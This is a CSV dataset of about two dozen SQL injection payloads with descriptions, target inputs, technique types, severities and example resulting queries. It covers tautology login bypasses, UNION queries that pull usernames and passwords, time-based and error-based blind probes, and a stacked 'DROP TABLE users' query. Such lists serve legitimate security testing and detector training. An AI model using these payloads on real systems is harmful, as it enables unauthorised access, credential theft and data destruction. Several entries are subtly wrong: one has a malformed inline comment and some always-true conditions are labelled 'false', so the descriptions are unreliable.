id,description,payload,context,type,severity,example_query,example_usage
sqli-001,Basic tautology-based SQL injection,' OR '1'='1,Login form username input,tautology,high,SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '',
sqli-002,Union-based SQL injection to extract data,"' UNION SELECT username, password FROM users--",Search input field,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT username, password FROM users--",
sqli-003,Blind SQL injection with time delay,'; WAITFOR DELAY '0:0:5'--,ID parameter in URL,blind-time,medium,SELECT * FROM orders WHERE id = ''; WAITFOR DELAY '0:0:5'--,
sqli-004,Error-based SQL injection to reveal database version,"' AND 1=CONVERT(int,@@version)--",User ID input,error-based,medium,"SELECT * FROM users WHERE id = '' AND 1=CONVERT(int,@@version)--",
sqli-005,Boolean-based blind SQL injection,' AND 1=1--,Search field,boolean-blind,medium,SELECT * FROM products WHERE name = '' AND 1=1--,
sqli-006,Stacked queries to execute multiple statements,'; DROP TABLE users--,User input in form,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DROP TABLE users--,
sqli-007,Using comment to truncate query,' OR 1=1--,Login password field,tautology,high,SELECT * FROM users WHERE password = '' OR 1=1--,
sqli-008,Hex encoded payload,0x27 OR 0x31=0x31--,URL parameter,tautology,medium,SELECT * FROM products WHERE id = 0x27 OR 0x31=0x31--,
sqli-009,Using sleep for blind time-based injection,'; SELECT pg_sleep(5)--,PostgreSQL ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(5)--,
sqli-010,Extracting database user with error-based injection,"' AND 1=CONVERT(int,USER())--",User input,error-based,medium,"SELECT * FROM accounts WHERE user = '' AND 1=CONVERT(int,USER())--",
sqli-011,Blind boolean-based injection with AND condition,"' AND SUBSTRING(@@version,1,1)='5'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' AND SUBSTRING(@@version,1,1)='5'--",
sqli-012,Using OR with false condition to bypass filters,' OR 'a'='a,Login username,tautology,high,SELECT * FROM users WHERE username = '' OR 'a'='a' AND password = '',
sqli-013,Using double dash comment to truncate query,' OR 1=1-- -,Search field,tautology,high,SELECT * FROM items WHERE name = '' OR 1=1-- -,
sqli-014,Using inline comment to bypass filters,'//OR//1=1--,Login form,tautology,high,SELECT * FROM users WHERE username = ''//OR//1=1--,
sqli-015,Using cast to bypass filters,' OR CAST('a' AS INT)=CAST('a' AS INT)--,User input,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST('a' AS INT)=CAST('a' AS INT)--,
sqli-016,Using sleep in MySQL for time-based blind injection,' OR SLEEP(5)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR SLEEP(5)--,
sqli-017,Using extractvalue for error-based injection,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",User input,error-based,high,"SELECT * FROM users WHERE id = '' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
sqli-018,Using updatexml for error-based injection,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",User input,error-based,high,"SELECT * FROM users WHERE id = '' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
sqli-019,Using sleep in PostgreSQL for time-based injection,'; SELECT pg_sleep(10)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(10)--,
sqli-021,Using OR with sleep for time delay in MySQL,' OR SLEEP(10)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(10)--,
sqli-022,Using UNION SELECT with NULLs to bypass column count,"' UNION SELECT NULL, NULL, username, password FROM users--",Search field,union,high,"SELECT id, name, description FROM products WHERE name = '' UNION SELECT NULL, NULL, username, password FROM users--",
sqli-023,Using OR with false condition and inline comment,' OR 1=1/*,Login username,tautology,high,SELECT * FROM users WHERE username = '' OR 1=1/*,
sqli-024,Using AND with subquery for blind boolean injection,' AND (SELECT COUNT(*) FROM users) > 0--,Search input,boolean-blind,medium,SELECT * FROM products WHERE name = '' AND (SELECT COUNT(*) FROM users) > 0--,
sqli-025,Using OR with sleep for time delay in PostgreSQL,' OR pg_sleep(7)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(7)--,
